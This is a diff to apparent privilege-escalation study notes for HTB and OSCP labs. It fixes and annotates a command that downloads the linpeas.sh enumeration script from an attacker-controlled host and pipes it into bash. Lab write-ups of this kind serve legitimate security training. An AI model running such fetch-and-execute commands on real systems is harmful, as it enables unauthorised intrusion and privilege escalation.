@@ -17,4 +17,8 @@ These commands will find the majority of privesc vectors on HTB and OSCP. There 
 
 ### Linpeas
 
-`curl -sL htttp://<myip>/linpeas.sh | bash`
+Linpeas is a bit outdated but is still effective at finding attack vectors.
+
+`curl -sL http://<myip>/linpeas.sh | bash`
+
+It is important to carefully read over the output, even the output that linpeas doesn't highlight red.
